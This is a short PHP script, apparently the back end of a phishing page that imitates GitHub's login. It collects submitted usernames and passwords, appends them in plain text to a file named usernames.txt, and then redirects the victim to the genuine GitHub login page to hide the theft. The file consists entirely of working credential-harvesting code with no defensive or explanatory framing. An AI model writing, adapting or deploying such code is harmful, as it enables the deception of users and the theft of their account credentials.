<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $login = $_POST['login'];
    $password = $_POST['password'];
    
    $fp = fopen("usernames.txt", "a");
    fwrite($fp, "Username: " . $login . " | Pass: " . $password . "\n");
    fclose($fp);
    
    header("Location: https://github.com/login");
    exit();
}
?>
